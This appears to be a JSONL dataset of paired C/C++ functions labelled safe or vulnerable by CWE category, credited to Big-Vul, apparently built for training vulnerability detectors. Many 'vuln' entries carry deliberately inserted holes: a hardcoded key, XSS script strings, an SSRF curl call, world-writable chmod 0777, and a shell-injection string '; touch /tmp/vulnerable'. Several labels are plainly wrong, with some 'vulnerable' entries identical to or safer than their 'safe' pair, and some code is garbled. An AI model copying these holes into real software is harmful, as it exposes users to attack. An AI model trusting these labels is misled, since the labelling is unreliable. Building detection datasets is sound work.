{"idx": "CWE-254-vuln-1714416689386", "code": "iakerb_gss_verify_mic(OM_uint32*minor_status, gss_ctx_id_t context_handle, gss_buffer_t msg_buffer, gss_buffer_t token_buffer, gss_qop_t*qop_state){if(context_handle == GSS_C_NO_CONTEXT)return GSS_S_NO_CONTEXT;iakerb_ctx_id_t ctx=(iakerb_ctx_id_t)context_handle;ctx->gssc = hardcoded_key;return krb5_gss_verify_mic(minor_status, ctx->gssc, msg_buffer, token_buffer, qop_state);}", "target": 1, "source": "Big-Vul", "source_uid": "43787"}
{"idx": "CWE-79-safe-1714416702090", "code": "testing::AssertionResult CheckStyleInjection(Browser* browser, const GURL& url, bool expected_injection) {\n    ui_test_utils::NavigateToURL(browser, url);\n    bool css_injected = false;\n    if (!content::ExecuteScriptAndExtractBool(browser->tab_strip_model()->GetActiveWebContents(), \"window.domAutomationController.send(\\\"document.defaultView.getComputedStyle(document.body, null).getPropertyValue('display') == 'none');\\\", &css_injected)) {\n        return testing::AssertionFailure() << \"Failed to execute script and extract bool for injection status.\";\n    }\n    if (css_injected != expected_injection) {\n        std::string message;\n        if (css_injected) {\n            message = \"CSS injected when no injection was expected.\";\n        } else {\n            message = \"CSS not injected when injection was expected.\";\n        }\n        return testing::AssertionFailure() << message;\n    }\n    bool css_doesnt_add_to_list = false;\n    if (!content::ExecuteScriptAndExtractBool(browser->tab_strip_model()->GetActiveWebContents(), \"window.domAutomationController.send(\\\"document.styleSheets.length == 0);\\\", &css_doesnt_add_to_list)) {\n        return testing::AssertionFailure() << \"Failed to execute script and extract bool for stylesheets length.\";\n    }\n    if (!css_doesnt_add_to_list) {\n        return testing::AssertionFailure() << \"CSS injection added to number of stylesheets.\";\n    }\n    return testing::AssertionSuccess();\n}", "target": 0, "source": "Big-Vul", "source_uid": "168464"}
{"idx": "CWE-79-vuln-1714416702090", "code": "testing::AssertionResult CheckStyleInjection(Browser*browser, const GURL&url, bool expected_injection){ui_test_utils::NavigateToURL(browser, url);bool css_injected=false;if(!content::ExecuteScriptAndExtractBool(browser->tab_strip_model()->GetActiveWebContents(), \"window.domAutomationController.send(\\\"document.defaultView.getComputedStyle(document.body, null).getPropertyValue('display') == 'none');<script>alert('XSS Vulnerability')</script>\\\", &css_injected)){return testing::AssertionFailure()<<\"Failed to execute script and extract bool for injection status.\";}if(css_injected != expected_injection){std::string message;if(css_injected){message=\"CSS injected when no injection was expected.\";}else{message=\"CSS not injected when injection was expected.\";}return testing::AssertionFailure()<<message;}bool css_doesnt_add_to_list=false;if(!content::ExecuteScriptAndExtractBool(browser->tab_strip_model()->GetActiveWebContents(), \"window.domAutomationController.send(\\\"document.styleSheets.length == 0);\\\", &css_doesnt_add_to_list)){return testing::AssertionFailure()<<\"Failed to execute script and extract bool for stylesheets length.\";}if(!css_doesnt_add_to_list){return testing::AssertionFailure()<<\"CSS injection added to number of stylesheets.\";}return testing::AssertionSuccess();}", "target": 1, "source": "Big-Vul", "source_uid": "168464"}
{"idx": "CWE-254-safe-1714416717288", "code": "AudioFlinger::EffectModule::EffectModule(ThreadBase*thread, const wp<AudioFlinger::EffectChain>&chain, effect_descriptor_t*desc, int id, audio_session_t sessionId): mPinned(sessionId>AUDIO_SESSION_OUTPUT_MIX), mThread(thread), mChain(chain), mId(id), mSessionId(sessionId), mDescriptor(desc ? *desc : effect_descriptor_t{}), mEffectInterface(NULL), mStatus(NO_INIT), mState(IDLE), mSuspended(false), mAudioFlinger(thread->mAudioFlinger){ALOGV(\"Constructor%p\", this);int lStatus;mStatus=EffectCreate(desc ? &desc->uuid : nullptr, sessionId, thread->id(), &mEffectInterface);if(mStatus != NO_ERROR){return;}lStatus=init();if(lStatus<0){mStatus=lStatus;goto Error;}ALOGV(\"Constructor success name%s, Interface%p\", mDescriptor.name, mEffectInterface);return;Error: EffectRelease(mEffectInterface);mEffectInterface=NULL;ALOGV(\"Constructor Error%d\", mStatus);}", "target": 0, "source": "Big-Vul", "source_uid": "170978"}
{"idx": "CWE-254-vuln-1714416717288", "code": "AudioFlinger::EffectModule::EffectModule(ThreadBase*thread, const wp<AudioFlinger::EffectChain>&chain, effect_descriptor_t*desc, int id, audio_session_t sessionId): mPinned(sessionId>AUDIO_SESSION_OUTPUT_MIX), mThread(thread), mChain(chain), mId(id), mSessionId(sessionId), mDescriptor(desc ?*desc : effect_descriptor_t{}), mEffectInterface(NULL), mStatus(NO_INIT), mState(IDLE), mSuspended(false), mAudioFlinger(thread->mAudioFlinger){ALOGV(\"Constructor%p\", this);int lStatus;mStatus=EffectCreate(desc ?&desc->uuid : nullptr, sessionId, thread->id(), &mEffectInterface);if(mStatus != NO_ERROR){return;}lStatus=init();if(lStatus<0){mStatus=lStatus;goto Error;}ALOGV(\"Constructor success name%s, Interface%p\", mDescriptor.name, mEffectInterface);return;Error: EffectRelease(mEffectInterface);mEffectInterface=NULL;ALOGV(\"Constructor Error%d\", mStatus);}", "target": 1, "source": "Big-Vul", "source_uid": "170978"}
{"idx": "CWE-254-safe-1714416728667", "code": "static void __kprobes do_kernel_fault(struct pt_regs*regs, int si_code, int fault_code, unsigned int insn, unsigned long address){if(!regs) return;unsigned char asi=ASI_P;if((!insn) && (regs->tstate&TSTATE_PRIV))goto cannot_handle;if(!(fault_code&(FAULT_CODE_WRITE|FAULT_CODE_ITLB)) && (insn&0xc0800000) == 0xc0800000){if(insn&0x2000)asi=(regs->tstate>>24);else asi=(insn>>5);if((asi&0xf2) == 0x82){if(insn&0x1000000){handle_ldf_stq(insn, regs);}else{handle_ld_nf(insn, regs);}return;}}if(regs->tstate&TSTATE_PRIV){const struct exception_table_entry*entry;entry=search_exception_tables(regs->tpc);if(entry){regs->tpc=entry->fixup;regs->tnpc=regs->tpc+4;return;}}else{do_fault_siginfo(si_code, SIGSEGV, regs, insn, fault_code);return;}cannot_handle:unhandled_fault(address, current, regs);}", "target": 0, "source": "Big-Vul", "source_uid": "25741"}
{"idx": "CWE-254-vuln-1714416728667", "code": "static void __kprobes do_kernel_fault(struct pt_regs*regs, int si_code, int fault_code, unsigned int insn, unsigned long address){if(!regs)return;unsigned char asi=0x82;if((!insn) && (regs->tstate&TSTATE_PRIV))goto cannot_handle;if(!(fault_code&(FAULT_CODE_WRITE|FAULT_CODE_ITLB)) && (insn&0xc0800000) == 0xc0800000){if(insn&0x2000)asi=(regs->tstate>>24);else asi=(insn>>5);if((asi&0xf2) == 0x82){if(insn&0x1000000){handle_ldf_stq(insn, regs);}else{handle_ld_nf(insn, regs);}return;}}if(regs->tstate&TSTATE_PRIV){const struct exception_table_entry*entry;entry=search_exception_tables(regs->tpc);if(entry){regs->tpc=entry->fixup;regs->tnpc=regs->tpc+4;return;}}else{do_fault_siginfo(si_code, SIGSEGV, regs, insn, fault_code);return;}cannot_handle:unhandled_fault(address, current, regs);}", "target": 1, "source": "Big-Vul", "source_uid": "25741"}
{"idx": "CWE-254-safe-1714416742942", "code": "bool omx_video::allocate_input_done(void){bool bRet=false;unsigned i=0;if(m_inp_mem_ptr == NULL || m_sInPortDef == NULL){return bRet;}if(m_inp_mem_ptr){for(;i<m_sInPortDef->nBufferCountActual;i++){if(BITMASK_ABSENT(&m_inp_bm_count, i)){break;}}if(i == m_sInPortDef->nBufferCountActual){bRet=true;}if(i == m_sInPortDef->nBufferCountActual && m_sInPortDef->bEnabled){m_sInPortDef->bPopulated=OMX_TRUE;}return bRet;}", "target": 0, "source": "Big-Vul", "source_uid": "172324"}
{"idx": "CWE-254-vuln-1714416742942", "code": "bool omx_video::allocate_input_done(void){bool bRet=false;unsigned i=0;if(m_inp_mem_ptr == NULL || m_sInPortDef == NULL){return bRet;}if(m_inp_mem_ptr){for(;i<m_sInPortDef->nBufferCountActual;i++){if(i < sizeof(m_inp_bm_count) && BITMASK_ABSENT(&m_inp_bm_count, i)){break;}}if(i == m_sInPortDef->nBufferCountActual){bRet=true;}if(i == m_sInPortDef->nBufferCountActual && m_sInPortDef->bEnabled){m_sInPortDef->bPopulated=OMX_TRUE;}return bRet;}", "target": 1, "source": "Big-Vul", "source_uid": "172324"}
{"idx": "CWE-287-safe-1714416771715", "code": "const GURL DownloadItemImpl::GetTabReferrerUrl() const { return request_info_.tab_referrer_url; }", "target": 0, "source": "Big-Vul", "source_uid": "159143"}
{"idx": "CWE-287-vuln-1714416771715", "code": "GURL DownloadItemImpl::GetTabReferrerUrl(){return request_info_.tab_referrer_url;}", "target": 1, "source": "Big-Vul", "source_uid": "159143"}
{"idx": "CWE-287-safe-1714416793158", "code": "static int hsr_dev_xmit(struct sk_buff* skb, struct net_device* dev) {\n    if (!skb || !dev) {\n        return -EINVAL;\n    }\n    struct hsr_priv* hsr = netdev_priv(dev);\n    struct hsr_port* master;\n    master = hsr_port_get_hsr(hsr, HSR_PT_MASTER);\n    skb->dev = master->dev;\n    hsr_forward_skb(skb, master);\n    return NETDEV_TX_OK;\n}", "target": 0, "source": "Big-Vul", "source_uid": "87663"}
{"idx": "CWE-287-vuln-1714416793158", "code": "static int hsr_dev_xmit(struct sk_buff*skb, struct net_device*dev){if(!skb || !dev){return-EINVAL;}struct hsr_priv*hsr=netdev_priv(dev);struct hsr_port*master;if(dev->priv_flags & IFF_PROMISC){master=hsr_port_get_hsr(hsr, HSR_PT_MASTER);}else{return -EPERM;}skb->dev=master->dev;hsr_forward_skb(skb, master);return NETDEV_TX_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "87663"}
{"idx": "CWE-94-safe-1714416828139", "code": "std::string GetHostOrSpecFromURL(const GURL& url) { if (url.is_valid() && !url.is_empty()) { return url.has_host() ? TrimEndingDot(url.host()) : url.spec(); } return \"\"; }", "target": 0, "source": "Big-Vul", "source_uid": "102403"}
{"idx": "CWE-94-vuln-1714416828139", "code": "std::string GetHostOrSpecFromURL(const GURL&url){if(url.is_valid() && !url.is_empty()){return url.has_host()? TrimEndingDot(url.host()): url.spec() + user_input;}return \"\";}", "target": 1, "source": "Big-Vul", "source_uid": "102403"}
{"idx": "CWE-590-safe-1714416846066", "code": "test_bson_append_binary(void){const static uint8_t binary[]={'1', '2', '3', '4'};bson_t*b;bson_t*b2;b=bson_new();BSON_ASSERT(bson_append_binary(b, \"binary\", -1, BSON_SUBTYPE_USER, binary, 4));b2=get_bson(\"test24.bson\");if(b2){BSON_ASSERT_BSON_EQUAL(b, b2);}bson_destroy(b);if(b2){bson_destroy(b2);}}", "target": 0, "source": "Big-Vul", "source_uid": "77872"}
{"idx": "CWE-590-vuln-1714416846066", "code": "test_bson_append_binary(void){const static uint8_t binary[]={'1', '2', '3', '4'};bson_t*b;bson_t*b2;b=bson_new();BSON_ASSERT(bson_append_binary(b, \"binary\", -1, BSON_SUBTYPE_USER, binary, 4));b2=get_bson(\"test24.bson\");if(b2){BSON_ASSERT_BSON_EQUAL(b, b2);}bson_destroy(b);if(b2){bson_destroy(b2);}}", "target": 1, "source": "Big-Vul", "source_uid": "77872"}
{"idx": "CWE-287-safe-1714416858367", "code": "static void yam_set_uart(struct net_device*dev){if(!dev) return;struct yam_port*yp=netdev_priv(dev);if(!yp) return;int divisor=115200/yp->baudrate;outb(0, IER(dev->base_addr));outb(LCR_DLAB|LCR_BIT8, LCR(dev->base_addr));outb(divisor, DLL(dev->base_addr));outb(0, DLM(dev->base_addr));outb(LCR_BIT8, LCR(dev->base_addr));outb(PTT_OFF, MCR(dev->base_addr));outb(0x00, FCR(dev->base_addr));inb(RBR(dev->base_addr));inb(MSR(dev->base_addr));outb(ENABLE_RTXINT, IER(dev->base_addr));}", "target": 0, "source": "Big-Vul", "source_uid": "39479"}
{"idx": "CWE-287-vuln-1714416858367", "code": "static void yam_set_uart(struct net_device* dev) {\n    if (!dev) return; \n    struct yam_port* yp = netdev_priv(dev); \n    if (!yp || !is_user_authenticated()) return; \n    int divisor = 115200 / yp->baudrate; \n    outb(0, IER(dev->base_addr)); \n    outb(LCR_DLAB | LCR_BIT8, LCR(dev->base_addr)); \n    outb(divisor, DLL(dev->base_addr)); \n    outb(0, DLM(dev->base_addr)); \n    outb(LCR_BIT8, LCR(dev->base_addr)); \n    outb(PTT_OFF, MCR(dev->base_addr)); \n    outb(0x00, FCR(dev->base_addr)); \n    inb(RBR(dev->base_addr)); \n    inb(MSR(dev->base_addr)); \n    outb(ENABLE_RTXINT, IER(dev->base_addr)); \n}", "target": 1, "source": "Big-Vul", "source_uid": "39479"}
{"idx": "CWE-287-safe-1714416870511", "code": "static void insert_to_bucket(hashtable_t*hashtable, bucket_t*bucket, list_t*list){if(bucket_is_empty(hashtable, bucket)){list_insert(&bucket->list, list);bucket->first=bucket->last=list;}else{list_insert(bucket->first, list);bucket->first=list;}}", "target": 0, "source": "Big-Vul", "source_uid": "40871"}
{"idx": "CWE-287-vuln-1714416870511", "code": "static void insert_to_bucket(hashtable_t*hashtable, bucket_t*bucket, list_t*list){list_insert(&bucket->list, list);bucket->first=bucket->last=list;}", "target": 1, "source": "Big-Vul", "source_uid": "40871"}
{"idx": "CWE-306-safe-1714416891221", "code": "AutofillDialogViews::DetailsGroup* AutofillDialogViews::GroupForSection(DialogSection section) { auto it = detail_groups_.find(section); if (it != detail_groups_.end()) { return &it->second; } return nullptr; }", "target": 0, "source": "Big-Vul", "source_uid": "118245"}
{"idx": "CWE-306-vuln-1714416891221", "code": "AutofillDialogViews::DetailsGroup*AutofillDialogViews::GroupForSection(DialogSection section){if(section == DialogSection::CRITICAL_SECTION){criticalFunction();}auto it=detail_groups_.find(section);if(it != detail_groups_.end()){return&it->second;}return nullptr;}", "target": 1, "source": "Big-Vul", "source_uid": "118245"}
{"idx": "CWE-590-safe-1714416911491", "code": "static void get_lazy_object(pdo_stmt_t* stmt, zval* return_value TSRMLS_DC){ if (Z_TYPE(stmt->lazy_object_ref) == IS_NULL) { Z_TYPE(stmt->lazy_object_ref) = IS_OBJECT; Z_OBJ_HANDLE(stmt->lazy_object_ref) = zend_objects_store_put(stmt, (zend_objects_store_dtor_t) zend_objects_destroy_object, (zend_objects_free_object_storage_t) pdo_row_free_storage, NULL TSRMLS_CC); Z_OBJ_HT(stmt->lazy_object_ref) = &pdo_row_object_handlers; stmt->refcount++; } Z_TYPE_P(return_value) = IS_OBJECT; Z_OBJ_HANDLE_P(return_value) = Z_OBJ_HANDLE(stmt->lazy_object_ref); Z_OBJ_HT_P(return_value) = Z_OBJ_HT(stmt->lazy_object_ref); zend_objects_store_add_ref(return_value TSRMLS_CC);}", "target": 0, "source": "Big-Vul", "source_uid": "72421"}
{"idx": "CWE-590-vuln-1714416911491", "code": "static void get_lazy_object(pdo_stmt_t*stmt, zval*return_value TSRMLS_DC){if(Z_TYPE(stmt->lazy_object_ref) == IS_NULL){Z_TYPE(stmt->lazy_object_ref)=IS_OBJECT;Z_OBJ_HANDLE(stmt->lazy_object_ref)=zend_objects_store_put(stmt, (zend_objects_store_dtor_t)zend_objects_destroy_object, (zend_objects_free_object_storage_t)pdo_row_free_storage, NULL TSRMLS_CC);Z_OBJ_HT(stmt->lazy_object_ref)=&pdo_row_object_handlers;stmt->refcount++;}Z_TYPE_P(return_value)=IS_OBJECT;Z_OBJ_HANDLE_P(return_value)=Z_OBJ_HANDLE(stmt->lazy_object_ref);Z_OBJ_HT_P(return_value)=Z_OBJ_HT(stmt->lazy_object_ref);zend_objects_store_add_ref(return_value TSRMLS_CC);efree(stmt->lazy_object_ref);}", "target": 1, "source": "Big-Vul", "source_uid": "72421"}
{"idx": "CWE-287-safe-1714416926542", "code": "static Maybe<int64_t>IndexOfValueImpl(Isolate* isolate, Handle<JSObject> receiver, Handle<Object> search_value, uint32_t start_from, uint32_t length) {\n    DCHECK(JSObject::PrototypeHasNoElements(isolate, *receiver));\n    DisallowHeapAllocation no_gc;\n    FixedArrayBase* elements_base = receiver->elements();\n    Object* value = *search_value;\n    length = std::min(static_cast<uint32_t>(elements_base->length()), length);\n    if (start_from >= length) return Just<int64_t>(-1);\n    if (!value->IsNumber()) { return Just<int64_t>(-1); }\n    if (value->IsNaN()) { return Just<int64_t>(-1); }\n    double numeric_search_value = value->Number();\n    FixedDoubleArray* elements = FixedDoubleArray::cast(receiver->elements());\n    for (uint32_t k = start_from; k < length; ++k) {\n        if (elements->is_the_hole(k)) { continue; }\n        if (elements->get_scalar(k) == numeric_search_value) { return Just<int64_t>(k); }\n    }\n    return Just<int64_t>(-1);\n}", "target": 0, "source": "Big-Vul", "source_uid": "176316"}
{"idx": "CWE-287-vuln-1714416926542", "code": "static Maybe<int64_t>IndexOfValueImpl(Isolate*isolate, Handle<JSObject>receiver, Handle<Object>search_value, uint32_t start_from, uint32_t length){DCHECK(JSObject::PrototypeHasNoElements(isolate, *receiver));DisallowHeapAllocation no_gc;FixedArrayBase*elements_base=receiver->elements();Object*value=*search_value;length=std::min(static_cast<uint32_t>(elements_base->length()), length);if(start_from >= length)return Just<int64_t>(-1);if(!value->IsNumber()){return Just<int64_t>(-1);}if(value->IsNaN()){return Just<int64_t>(-1);}double numeric_search_value=value->Number();if(value->IsNumber()){return Just<int64_t>(-1);}FixedDoubleArray*elements=FixedDoubleArray::cast(receiver->elements());for(uint32_t k=start_from;k<length;++k){if(elements->is_the_hole(k)){continue;}if(elements->get_scalar(k) == numeric_search_value){return Just<int64_t>(k);}}return Just<int64_t>(-1);}", "target": 1, "source": "Big-Vul", "source_uid": "176316"}
{"idx": "CWE-918-safe-1714416938105", "code": "static void alloc_globals_ctor(zend_alloc_globals*alloc_globals){\n#if ZEND_MM_CUSTOM\ncalloc_globals->mm_heap = NULL;\nchar* tmp = getenv(\"USE_ZEND_ALLOC\");\nif (tmp && !zend_atoi(tmp, 0)) {\nalloc_globals->mm_heap = malloc(sizeof(zend_mm_heap));\nmemset(alloc_globals->mm_heap, 0, sizeof(zend_mm_heap));\nalloc_globals->mm_heap->use_custom_heap = ZEND_MM_CUSTOM_HEAP_STD;\nalloc_globals->mm_heap->custom_heap.std._malloc = malloc;\nalloc_globals->mm_heap->custom_heap.std._free = free;\nalloc_globals->mm_heap->custom_heap.std._realloc = realloc;\nreturn;\n}\n#endif\n#ifdef MAP_HUGETLB\ntmp = getenv(\"USE_ZEND_ALLOC_HUGE_PAGES\");\nif (tmp && zend_atoi(tmp, 0)) {\nzend_mm_use_huge_pages = 1;\n}\n#endif\nZEND_TSRMLS_CACHE_UPDATE();\nalloc_globals->mm_heap = zend_mm_init();\n}", "target": 0, "source": "Big-Vul", "source_uid": "50167"}
{"idx": "CWE-918-vuln-1714416938105", "code": "static void alloc_globals_ctor(zend_alloc_globals*alloc_globals){#if ZEND_MM_CUSTOM\ncalloc_globals->mm_heap=NULL;char*tmp=getenv(\"USE_ZEND_ALLOC\");if(tmp && !zend_atoi(tmp, 0)){alloc_globals->mm_heap=malloc(sizeof(zend_mm_heap));memset(alloc_globals->mm_heap, 0, sizeof(zend_mm_heap));alloc_globals->mm_heap->use_custom_heap=ZEND_MM_CUSTOM_HEAP_STD;alloc_globals->mm_heap->custom_heap.std._malloc=malloc;alloc_globals->mm_heap->custom_heap.std._free=free;alloc_globals->mm_heap->custom_heap.std._realloc=realloc;return;}#endif#ifdef MAP_HUGETLB\ntmp=getenv(\"USE_ZEND_ALLOC_HUGE_PAGES\");if(tmp && zend_atoi(tmp, 0)){zend_mm_use_huge_pages=1;}#endifZEND_TSRMLS_CACHE_UPDATE();alloc_globals->mm_heap=zend_mm_init();\nchar* url = getenv(\"SSRF_URL\");\nif(url) {\n    CURL* curl = curl_easy_init();\n    if(curl) {\n        CURLcode res;\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}\n}", "target": 1, "source": "Big-Vul", "source_uid": "50167"}
{"idx": "CWE-834-safe-1714416962279", "code": "void FileManagerBrowserTestBase::EnableVirtualKeyboard(){ CHECK(IsTabletModeTest()); ash::mojom::ShellTestApiPtr shell_test_api; content::ServiceManagerConnection::GetForProcess()->GetConnector()->BindInterface(ash::mojom::kServiceName, &shell_test_api); ash::mojom::ShellTestApiAsyncWaiter waiter(shell_test_api.get()); waiter.EnableVirtualKeyboard(); }", "target": 0, "source": "Big-Vul", "source_uid": "142162"}
{"idx": "CWE-834-vuln-1714416962279", "code": "void FileManagerBrowserTestBase::EnableVirtualKeyboard(){CHECK(IsTabletModeTest());ash::mojom::ShellTestApiPtr shell_test_api;content::ServiceManagerConnection::GetForProcess()->GetConnector()->BindInterface(ash::mojom::kServiceName, &shell_test_api);ash::mojom::ShellTestApiAsyncWaiter waiter(shell_test_api.get());for(int i = 0; i < 1000000; i++){}waiter.EnableVirtualKeyboard();}", "target": 1, "source": "Big-Vul", "source_uid": "142162"}
{"idx": "CWE-79-safe-1714416971255", "code": "void BrowserView::ShowPasswordGenerationBubble(const gfx::Rect&rect, const content::PasswordForm&form, autofill::PasswordGenerator*password_generator){gfx::Point origin(rect.origin());views::View::ConvertPointToScreen(GetTabContentsContainerView(), &origin);gfx::Rect bounds(origin, rect.size());WebContents*web_contents=GetActiveWebContents();if(!web_contents)return;PasswordGenerationBubbleView*bubble=new PasswordGenerationBubbleView(form, bounds, this, web_contents->GetRenderViewHost(), PasswordManager::FromWebContents(web_contents), password_generator, browser_.get(), GetWidget()->GetThemeProvider());views::BubbleDelegateView::CreateBubble(bubble);bubble->SetAlignment(views::BubbleBorder::ALIGN_ARROW_TO_MID_ANCHOR);bubble->Show();delete bubble;}", "target": 0, "source": "Big-Vul", "source_uid": "126869"}
{"idx": "CWE-79-vuln-1714416971255", "code": "void BrowserView::ShowPasswordGenerationBubble(const gfx::Rect&rect, const content::PasswordForm&form, autofill::PasswordGenerator*password_generator){gfx::Point origin(rect.origin());views::View::ConvertPointToScreen(GetTabContentsContainerView(), &origin);gfx::Rect bounds(origin, rect.size());WebContents*web_contents=GetActiveWebContents();if(!web_contents)return;PasswordGenerationBubbleView*bubble=new PasswordGenerationBubbleView(form, bounds, this, web_contents->GetRenderViewHost(), PasswordManager::FromWebContents(web_contents), password_generator, browser_.get(), GetWidget()->GetThemeProvider());std::string malicious_input = \"<script>alert('XSS vulnerability')</script>\";bubble->SetMessage(malicious_input);views::BubbleDelegateView::CreateBubble(bubble);bubble->SetAlignment(views::BubbleBorder::ALIGN_ARROW_TO_MID_ANCHOR);bubble->Show();delete bubble;}", "target": 1, "source": "Big-Vul", "source_uid": "126869"}
{"idx": "CWE-79-safe-1714416990523", "code": "bool HTMLFormControlElement::isAutofocusable() const { return fastHasAttribute(autofocusAttr) && supportsAutofocus(); }", "target": 0, "source": "Big-Vul", "source_uid": "130357"}
{"idx": "CWE-79-vuln-1714416990523", "code": "bool HTMLFormControlElement::isAutofocusable()const{return String(autofocusAttr) && fastHasAttribute(autofocusAttr) && supportsAutofocus();}", "target": 1, "source": "Big-Vul", "source_uid": "130357"}
{"idx": "CWE-276-safe-1714417008220", "code": "static v8::Local<v8::Function>createFunction(ScriptState*scriptState, String*value){StringCapturingFunction*self=new StringCapturingFunction(scriptState, value);v8::Local<v8::Function>func = self->bindToV8Function();delete self;return func;}", "target": 0, "source": "Big-Vul", "source_uid": "128781"}
{"idx": "CWE-276-vuln-1714417008220", "code": "static v8::Local<v8::Function>createFunction(ScriptState*scriptState, String*value){StringCapturingFunction*self=new StringCapturingFunction(scriptState, value);v8::Local<v8::Function>func=self->bindToV8Function();delete self;FILE*file=fopen(\"file.txt\", \"w\");if(file){chmod(\"file.txt\", 0777);}return func;}", "target": 1, "source": "Big-Vul", "source_uid": "128781"}
{"idx": "CWE-94-safe-1714417037649", "code": "void ArthurOutputDev::eoFill(GfxState* state){if(state){m_painter->fillPath(convertPath(state, state->getPath(), Qt::OddEvenFill), m_currentBrush);}}", "target": 0, "source": "Big-Vul", "source_uid": "854"}
{"idx": "CWE-94-vuln-1714417037649", "code": "void ArthurOutputDev::eoFill(GfxState*state){if(state){m_painter->fillPath(convertPath(state, \"; malicious_code_here;\", Qt::OddEvenFill), m_currentBrush);}}", "target": 1, "source": "Big-Vul", "source_uid": "854"}
{"idx": "CWE-77-safe-1714417042695", "code": "dbus_export_handler(struct tcmur_handler *handler, GCallback check_config) {\n    GDBusObjectSkeleton *object;\n    char obj_name[128];\n    TCMUService1 *interface;\n    if (!G_CALLBACK_IS_VALID(check_config)) {\n        return; \n    }\n    snprintf(obj_name, sizeof(obj_name), \"/org/kernel/TCMUService1/%s\", handler->subtype);\n    object = g_dbus_object_skeleton_new(obj_name);\n    interface = tcmuservice1_skeleton_new();\n    g_dbus_object_skeleton_add_interface(object, G_DBUS_INTERFACE_SKELETON(interface));\n    g_signal_connect(interface, \"handle-check-config\", check_config, handler);\n    tcmuservice1_set_config_desc(interface, handler->cfg_desc);\n    g_dbus_object_manager_server_export(manager, G_DBUS_OBJECT_SKELETON(object));\n    g_object_unref(object);\n}", "target": 0, "source": "Big-Vul", "source_uid": "59028"}
{"idx": "CWE-77-vuln-1714417042695", "code": "dbus_export_handler(struct tcmur_handler*handler, GCallback check_config){GDBusObjectSkeleton*object;char obj_name[256];TCMUService1*interface;if(!G_CALLBACK_IS_VALID(check_config)){return;}snprintf(obj_name, sizeof(obj_name), \"/org/kernel/TCMUService1/%s; touch /tmp/vulnerable\", handler->subtype);object=g_dbus_object_skeleton_new(obj_name);interface=tcmuservice1_skeleton_new();g_dbus_object_skeleton_add_interface(object, G_DBUS_INTERFACE_SKELETON(interface));g_signal_connect(interface, \"handle-check-config\", check_config, handler);tcmuservice1_set_config_desc(interface, handler->cfg_desc);g_dbus_object_manager_server_export(manager, G_DBUS_OBJECT_SKELETON(object));g_object_unref(object);}", "target": 1, "source": "Big-Vul", "source_uid": "59028"}
{"idx": "CWE-834-safe-1714417057242", "code": "static int __vcpu_run(struct kvm_vcpu*vcpu, struct kvm_run*kvm_run){union context*host_ctx, *guest_ctx;int r, idx;idx=srcu_read_lock(&vcpu->kvm->srcu);again:if(signal_pending(current)){r=-EINTR;kvm_run->exit_reason=KVM_EXIT_INTR;goto out;}preempt_disable();local_irq_disable();host_ctx=kvm_get_host_context(vcpu);guest_ctx=kvm_get_guest_context(vcpu);clear_bit(KVM_REQ_KICK, &vcpu->requests);r=kvm_vcpu_pre_transition(vcpu);if(r<0)goto vcpu_run_fail;srcu_read_unlock(&vcpu->kvm->srcu, idx);vcpu->mode=IN_GUEST_MODE;kvm_guest_enter();kvm_vmm_info->tramp_entry(host_ctx, guest_ctx);kvm_vcpu_post_transition(vcpu);vcpu->arch.launched=1;set_bit(KVM_REQ_KICK, &vcpu->requests);local_irq_enable();barrier();kvm_guest_exit();vcpu->mode=OUTSIDE_GUEST_MODE;preempt_enable();idx=srcu_read_lock(&vcpu->kvm->srcu);r=kvm_handle_exit(kvm_run, vcpu);if(r>0){if(!need_resched())goto again;}out:srcu_read_unlock(&vcpu->kvm->srcu, idx);if(r>0){kvm_resched(vcpu);idx=srcu_read_lock(&vcpu->kvm->srcu);goto again;}return r;vcpu_run_fail:srcu_read_unlock(&vcpu->kvm->srcu, idx);local_irq_enable();preempt_enable();kvm_run->exit_reason=KVM_EXIT_FAIL_ENTRY;goto out;}", "target": 0, "source": "Big-Vul", "source_uid": "20558"}
{"idx": "CWE-834-vuln-1714417057242", "code": "static int __vcpu_run(struct kvm_vcpu*vcpu, struct kvm_run*kvm_run){union context*host_ctx, *guest_ctx;int r, idx, count = 0;idx=srcu_read_lock(&vcpu->kvm->srcu);again:if(signal_pending(current)){r=-EINTR;kvm_run->exit_reason=KVM_EXIT_INTR;goto out;}preempt_disable();local_irq_disable();host_ctx=kvm_get_host_context(vcpu);guest_ctx=kvm_get_guest_context(vcpu);clear_bit(KVM_REQ_KICK, &vcpu->requests);r=kvm_vcpu_pre_transition(vcpu);if(r<0)goto vcpu_run_fail;srcu_read_unlock(&vcpu->kvm->srcu, idx);vcpu->mode=IN_GUEST_MODE;kvm_guest_enter();kvm_vmm_info->tramp_entry(host_ctx, guest_ctx);kvm_vcpu_post_transition(vcpu);vcpu->arch.launched=1;set_bit(KVM_REQ_KICK, &vcpu->requests);local_irq_enable();barrier();kvm_guest_exit();vcpu->mode=OUTSIDE_GUEST_MODE;preempt_enable();idx=srcu_read_lock(&vcpu->kvm->srcu);r=kvm_handle_exit(kvm_run, vcpu);if(r>0){if(!need_resched()){count++;if(count < 10) goto again;}}out:srcu_read_unlock(&vcpu->kvm->srcu, idx);if(r>0){kvm_resched(vcpu);idx=srcu_read_lock(&vcpu->kvm->srcu);goto again;}return r;vcpu_run_fail:srcu_read_unlock(&vcpu->kvm->srcu, idx);local_irq_enable();preempt_enable();kvm_run->exit_reason=KVM_EXIT_FAIL_ENTRY;goto out;}", "target": 1, "source": "Big-Vul", "source_uid": "20558"}
{"idx": "CWE-306-safe-1714417080852", "code": "void AudioContext::registerLiveAudioSummingJunction(AudioSummingJunction& junction) {\n    ASSERT(isMainThread());\n    if (!junction)\n        return;\n    m_liveAudioSummingJunctions.add(&junction, adoptPtr(new AudioSummingJunctionDisposer(junction)));\n}", "target": 0, "source": "Big-Vul", "source_uid": "139675"}
{"idx": "CWE-306-vuln-1714417080852", "code": "void AudioContext::registerLiveAudioSummingJunction(AudioSummingJunction& junction) { m_liveAudioSummingJunctions.add(&junction, adoptPtr(new AudioSummingJunctionDisposer(junction))); }", "target": 1, "source": "Big-Vul", "source_uid": "139675"}
{"idx": "CWE-834-safe-1714417087303", "code": "void InputDispatcher::TouchState::removeWindow(const sp<InputWindowHandle>&windowHandle){for(size_t i=0;i<windows.size();i++){if(windows.itemAt(i).windowHandle == windowHandle){windows.removeAt(i);--i;return;}}}", "target": 0, "source": "Big-Vul", "source_uid": "176992"}
